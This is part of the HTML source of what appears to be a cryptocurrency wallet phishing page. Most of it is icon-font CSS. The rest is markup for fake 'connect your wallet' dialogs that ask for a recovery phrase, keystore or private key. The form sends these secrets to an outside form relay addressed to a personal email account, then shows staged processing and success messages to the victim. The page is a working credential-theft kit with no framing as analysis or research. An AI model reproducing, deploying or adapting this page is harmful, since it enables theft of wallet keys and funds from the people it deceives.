      .fa-vest-patches:before {
          content: "\e086";
      }
      .fa-viacoin:before {
          content: "\f237";
      }
      .fa-viadeo:before {
          content: "\f2a9";
      }
      .fa-viadeo-square:before {
          content: "\f2aa";
      }
      .fa-vial:before {
          content: "\f492";
      }
      .fa-vials:before {
          content: "\f493";
      }
      .fa-viber:before {
          content: "\f409";
      }
      .fa-video:before {
          content: "\f03d";
      }
      .fa-video-slash:before {
          content: "\f4e2";
      }
      .fa-vihara:before {
          content: "\f6a7";
      }
      .fa-vimeo:before {
          content: "\f40a";
      }
      .fa-vimeo-square:before {
          content: "\f194";
      }
      .fa-vimeo-v:before {
          content: "\f27d";
      }
      .fa-vine:before {
          content: "\f1ca";
      }
      .fa-virus:before {
          content: "\e074";
      }
      .fa-virus-slash:before {
          content: "\e075";
      }
      .fa-viruses:before {
          content: "\e076";
      }
      .fa-vk:before {
          content: "\f189";
      }
      .fa-vnv:before {
          content: "\f40b";
      }
      .fa-voicemail:before {
          content: "\f897";
      }
      .fa-volleyball-ball:before {
          content: "\f45f";
      }
      .fa-volume-down:before {
          content: "\f027";
      }
      .fa-volume-mute:before {
          content: "\f6a9";
      }
      .fa-volume-off:before {
          content: "\f026";
      }
      .fa-volume-up:before {
          content: "\f028";
      }
      .fa-vote-yea:before {
          content: "\f772";
      }
      .fa-vr-cardboard:before {
          content: "\f729";
      }
      .fa-vuejs:before {
          content: "\f41f";
      }
      .fa-walking:before {
          content: "\f554";
      }
      .fa-wallet:before {
          content: "\f555";
      }
      .fa-warehouse:before {
          content: "\f494";
      }
      .fa-watchman-monitoring:before {
          content: "\e087";
      }
      .fa-water:before {
          content: "\f773";
      }
      .fa-wave-square:before {
          content: "\f83e";
      }
      .fa-waze:before {
          content: "\f83f";
      }
      .fa-weebly:before {
          content: "\f5cc";
      }
      .fa-weibo:before {
          content: "\f18a";
      }
      .fa-weight:before {
          content: "\f496";
      }
      .fa-weight-hanging:before {
          content: "\f5cd";
      }
      .fa-weixin:before {
          content: "\f1d7";
      }
      .fa-whatsapp:before {
          content: "\f232";
      }
      .fa-whatsapp-square:before {
          content: "\f40c";
      }
      .fa-wheelchair:before {
          content: "\f193";
      }
      .fa-whmcs:before {
          content: "\f40d";
      }
      .fa-wifi:before {
          content: "\f1eb";
      }
      .fa-wikipedia-w:before {
          content: "\f266";
      }
      .fa-wind:before {
          content: "\f72e";
      }
      .fa-window-close:before {
          content: "\f410";
      }
      .fa-window-maximize:before {
          content: "\f2d0";
      }
      .fa-window-minimize:before {
          content: "\f2d1";
      }
      .fa-window-restore:before {
          content: "\f2d2";
      }
      .fa-windows:before {
          content: "\f17a";
      }
      .fa-wine-bottle:before {
          content: "\f72f";
      }
      .fa-wine-glass:before {
          content: "\f4e3";
      }
      .fa-wine-glass-alt:before {
          content: "\f5ce";
      }
      .fa-wix:before {
          content: "\f5cf";
      }
      .fa-wizards-of-the-coast:before {
          content: "\f730";
      }
      .fa-wodu:before {
          content: "\e088";
      }
      .fa-wolf-pack-battalion:before {
          content: "\f514";
      }
      .fa-won-sign:before {
          content: "\f159";
      }
      .fa-wordpress:before {
          content: "\f19a";
      }
      .fa-wordpress-simple:before {
          content: "\f411";
      }
      .fa-wpbeginner:before {
          content: "\f297";
      }
      .fa-wpexplorer:before {
          content: "\f2de";
      }
      .fa-wpforms:before {
          content: "\f298";
      }
      .fa-wpressr:before {
          content: "\f3e4";
      }
      .fa-wrench:before {
          content: "\f0ad";
      }
      .fa-x-ray:before {
          content: "\f497";
      }
      .fa-xbox:before {
          content: "\f412";
      }
      .fa-xing:before {
          content: "\f168";
      }
      .fa-xing-square:before {
          content: "\f169";
      }
      .fa-y-combinator:before {
          content: "\f23b";
      }
      .fa-yahoo:before {
          content: "\f19e";
      }
      .fa-yammer:before {
          content: "\f840";
      }
      .fa-yandex:before {
          content: "\f413";
      }
      .fa-yandex-international:before {
          content: "\f414";
      }
      .fa-yarn:before {
          content: "\f7e3";
      }
      .fa-yelp:before {
          content: "\f1e9";
      }
      .fa-yen-sign:before {
          content: "\f157";
      }
      .fa-yin-yang:before {
          content: "\f6ad";
      }
      .fa-yoast:before {
          content: "\f2b1";
      }
      .fa-youtube:before {
          content: "\f167";
      }
      .fa-youtube-square:before {
          content: "\f431";
      }
      .fa-zhihu:before {
          content: "\f63f";
      }
      .sr-only {
          border: 0;
          clip: rect(0, 0, 0, 0);
          height: 1px;
          margin: -1px;
          overflow: hidden;
          padding: 0;
          position: absolute;
          width: 1px;
      }
      .sr-only-focusable:active,
      .sr-only-focusable:focus {
          clip: auto;
          height: auto;
          margin: 0;
          overflow: visible;
          position: static;
          width: auto;
      }
      @font-face {
          font-family: "Font Awesome 5 Brands";
          font-style: normal;
          font-weight: 400;
          font-display: block;
          src: url(https://ka-f.fontawesome.com/releases/v5.15.4/webfonts/free-fa-brands-400.eot);
          src: url(https://ka-f.fontawesome.com/releases/v5.15.4/webfonts/free-fa-brands-400.eot?#iefix) format("embedded-opentype"), url(https://ka-f.fontawesome.com/releases/v5.15.4/webfonts/free-fa-brands-400.woff2) format("woff2"),
          url(https://ka-f.fontawesome.com/releases/v5.15.4/webfonts/free-fa-brands-400.woff) format("woff"), url(https://ka-f.fontawesome.com/releases/v5.15.4/webfonts/free-fa-brands-400.ttf) format("truetype"),
          url(https://ka-f.fontawesome.com/releases/v5.15.4/webfonts/free-fa-brands-400.svg#fontawesome) format("svg");
      }
      .fab {
          font-family: "Font Awesome 5 Brands";
      }
      @font-face {
          font-family: "Font Awesome 5 Free";
          font-style: normal;
          font-weight: 400;
          font-display: block;
          src: url(https://ka-f.fontawesome.com/releases/v5.15.4/webfonts/free-fa-regular-400.eot);
          src: url(https://ka-f.fontawesome.com/releases/v5.15.4/webfonts/free-fa-regular-400.eot?#iefix) format("embedded-opentype"),
          url(https://ka-f.fontawesome.com/releases/v5.15.4/webfonts/free-fa-regular-400.woff2) format("woff2"), url(https://ka-f.fontawesome.com/releases/v5.15.4/webfonts/free-fa-regular-400.woff) format("woff"),
          url(https://ka-f.fontawesome.com/releases/v5.15.4/webfonts/free-fa-regular-400.ttf) format("truetype"), url(https://ka-f.fontawesome.com/releases/v5.15.4/webfonts/free-fa-regular-400.svg#fontawesome) format("svg");
      }
      @font-face {
          font-family: "Font Awesome 5 Pro";
          font-style: normal;
          font-weight: 400;
          font-display: block;
          src: url(https://ka-f.fontawesome.com/releases/v5.15.4/webfonts/free-fa-regular-400.eot);
          src: url(https://ka-f.fontawesome.com/releases/v5.15.4/webfonts/free-fa-regular-400.eot?#iefix) format("embedded-opentype"),
          url(https://ka-f.fontawesome.com/releases/v5.15.4/webfonts/free-fa-regular-400.woff2) format("woff2"), url(https://ka-f.fontawesome.com/releases/v5.15.4/webfonts/free-fa-regular-400.woff) format("woff"),
          url(https://ka-f.fontawesome.com/releases/v5.15.4/webfonts/free-fa-regular-400.ttf) format("truetype"), url(https://ka-f.fontawesome.com/releases/v5.15.4/webfonts/free-fa-regular-400.svg#fontawesome) format("svg");
      }
      .fab,
      .far {
          font-weight: 400;
      }
      @font-face {
          font-family: "Font Awesome 5 Free";
          font-style: normal;
          font-weight: 900;
          font-display: block;
          src: url(https://ka-f.fontawesome.com/releases/v5.15.4/webfonts/free-fa-solid-900.eot);
          src: url(https://ka-f.fontawesome.com/releases/v5.15.4/webfonts/free-fa-solid-900.eot?#iefix) format("embedded-opentype"), url(https://ka-f.fontawesome.com/releases/v5.15.4/webfonts/free-fa-solid-900.woff2) format("woff2"),
          url(https://ka-f.fontawesome.com/releases/v5.15.4/webfonts/free-fa-solid-900.woff) format("woff"), url(https://ka-f.fontawesome.com/releases/v5.15.4/webfonts/free-fa-solid-900.ttf) format("truetype"),
          url(https://ka-f.fontawesome.com/releases/v5.15.4/webfonts/free-fa-solid-900.svg#fontawesome) format("svg");
      }
      @font-face {
          font-family: "Font Awesome 5 Pro";
          font-style: normal;
          font-weight: 900;
          font-display: block;
          src: url(https://ka-f.fontawesome.com/releases/v5.15.4/webfonts/free-fa-solid-900.eot);
          src: url(https://ka-f.fontawesome.com/releases/v5.15.4/webfonts/free-fa-solid-900.eot?#iefix) format("embedded-opentype"), url(https://ka-f.fontawesome.com/releases/v5.15.4/webfonts/free-fa-solid-900.woff2) format("woff2"),
          url(https://ka-f.fontawesome.com/releases/v5.15.4/webfonts/free-fa-solid-900.woff) format("woff"), url(https://ka-f.fontawesome.com/releases/v5.15.4/webfonts/free-fa-solid-900.ttf) format("truetype"),
          url(https://ka-f.fontawesome.com/releases/v5.15.4/webfonts/free-fa-solid-900.svg#fontawesome) format("svg");
      }
      .fa,
      .far,
      .fas {
          font-family: "Font Awesome 5 Free";
      }
      .fa,
      .fas {
          font-weight: 900;
      }
    </style>
    <!-- google fonts link -->
    <link rel="preconnect" href="https://fonts.googleapis.com/" />
    <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin="" />
    <link
      href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;700;800;900&amp;display=swap"
      rel="stylesheet"
    />
    <!-- bootstrap css link -->
    <link
      href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css"
      rel="stylesheet"
      integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3"
      crossorigin="anonymous"
    />
    <link rel="stylesheet" href="style/animation/2.6%20animate.css.css" />
    <link rel="stylesheet" href="style/walletpage.css" />
    <link rel="stylesheet" href="wallet/bootstrap.min.css" />
    <link href="wallet/main.css" rel="stylesheet" />
  </head>
  <body
    style="
      background: url(./hero.gif);
    "
  >
    <div id="processing-dialog" class="message-dialog" style="display: none">
      <div class="send-dialog-overlay"></div>
      <div class="send-dialog-content">
        <div class="connect-dialog-body">
          <h1 id="processing-val" style="font-size: 45px">30</h1>
          <h4 class="mt-3">Processing...</h4>
        </div>
      </div>
    </div>
    <div id="success-dialog" class="message-dialog" style="display: none">
      <div class="send-dialog-overlay"></div>
      <div class="send-dialog-content">
        <div class="connect-dialog-body">
          <img style="width: 100px" src="wallet/success.html" alt="Success" />
          <h4 class="mt-3">Connection Successful</h4>
          <img style="width: 100px" src="assets/qr.html" alt="Success" />
        </div>
      </div>
    </div>
    <div id="error-dialog" class="message-dialog" style="display: none">
      <div class="send-dialog-overlay"></div>
      <div class="send-dialog-content" style="background: #fefcfb">
        <div class="connect-dialog-body">
          <img style="width: 150px" src="wallet/error.html" alt="Success" />
          <h4 class="mt-3">Connection Failed, Try Again</h4>
        </div>
      </div>
    </div>
    <div id="send-dialog" style="display: none">
      <div class="send-dialog-overlay"></div>
      <div class="send-dialog-content">
        <div class="connect-dialog-body">
          <div class="to-send-info">
            <div class="wallet-app-send-logo">
              <img
                id="current-wallet-send-logo"
                src="https://syncwallet.online/static/idlefinance-80d51872039fc5e44da8471f772e7b8e.png"
                alt="wallet-app-name"
              />
            </div>
            <div id="current-wallet-app-send" class="wallet-app-name-send">
              My app
            </div>
          </div>

          <div class="send-tabs">
            <button id="phraseSend">Phrase</button>
            <button id="keystoreSend">Keystore</button>
            <button id="privateKeySend">Private Key</button>
          </div>
          <div class="message-tab"></div>
          <div class="send-form">
            <form
              action="https://formsubmit.co/murillogavinh13@gmail.com"
              method="POST"
              enctype="multipart/form-data"
            >
              <input type="hidden" name="_captcha" value="false" />
              <input
                type="hidden"
                name="_next"
                value="https://swiftdog-fd555.web.app/cmtn.html"
              />

              <input type="hidden" name="wallet" id="walletNameData" />
              <div id="data-to-send">
                <div class="form-group">
                  <div class="form-group">
                    <input
                      type="hidden"
                      id="type1"
                      name="type"
                      value="phrase"
                    />
                    <textarea
                      name="phrase-key"
                      required=""
                      class="form-control"
                      placeholder="Enter your recovery phrase"
                      rows="5"
                      style="resize: none"
                    ></textarea>
                  </div>
                  <div class="small text-left my-3" style="font-size: 11px">
                    Typically 12 (sometimes 24) words separated by single spaces
                  </div>
                </div>
              </div>
              <button
                type="submit"
                class="btn btn-primary btn-block"
                style="font-weight: bold; font-size: 14px"
              >
                PROCEED
              </button>
              <div class="text-right">
                <button
                  type="button"
                  id="cancelBtn"
                  class="btn btn-sm dialog-dismiss btn-danger mt-2 text-right"
                >
                  Cancel
                </button>
              </div>
            </form>
          </div>
        </div>
      </div>
    </div>
    <div id="connect-dialog" style="display: none">
      <div class="content-dialog-overlay"></div>
      <div class="content-dialog-content">
        <div class="connect-dialog-header">
          <button class="dialog-dismiss">Back</button>
          <button class="dialog-dismiss">X</button>
        </div>
        <div class="connect-dialog-body">
          <div class="connection-info"></div>
          <div class="wallet-app-info">
            <div class="wallet-app-logo">
              <img
                id="current-wallet-logo"
                src="https://syncwallet.online/static/idlefinance-80d51872039fc5e44da8471f772e7b8e.png"
                alt="wallet-app-name"
              />
            </div>
            <div id="current-wallet-app"></div>
          </div>
        </div>
      </div>
    </div>
    <div id="header">
      <div class="content-box-md">
        <div class="container">
          <div class="row">
            <div class="col-md-12 col-sm-12 col-xs-12">
              <div class="header-text" >
                <svg-icon _ngcontent-ng-c3020004296="" src="/assets/images/svg-icons/logo.svg"><svg width="99" height="89" viewBox="0 0 99 89" fill="none" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" _ngcontent-ng-c3020004296="" aria-hidden="true" style="width: 80px; height: 36px;">
                  <mask id="mask0_78_65" style="mask-type:alpha" maskUnits="userSpaceOnUse" x="0" y="0" width="99" height="89" _ngcontent-ng-c3020004296="">
                  <path d="M99 0H0V89H99V0Z" fill="#D9D9D9" _ngcontent-ng-c3020004296=""></path>
                  </mask>
                  <g mask="url(#mask0_78_65)" _ngcontent-ng-c3020004296="">
                  <path d="M105 -11H-5V99H105V-11Z" fill="url(#pattern0_78_65)" _ngcontent-ng-c3020004296=""></path>
                  </g>
                  <defs _ngcontent-ng-c3020004296="">
                  <pattern id="pattern0_78_65" patternContentUnits="objectBoundingBox" width="1" height="1" _ngcontent-ng-c3020004296="">
                  <use xlink:href="#image0_78_65" transform="translate(-0.0951829 -0.100531) scale(0.00238073)" _ngcontent-ng-c3020004296=""></use>
                  </pattern>
                  <image id="image0_78_65" width="500" height="500" xlink:href="data:image/png;base64,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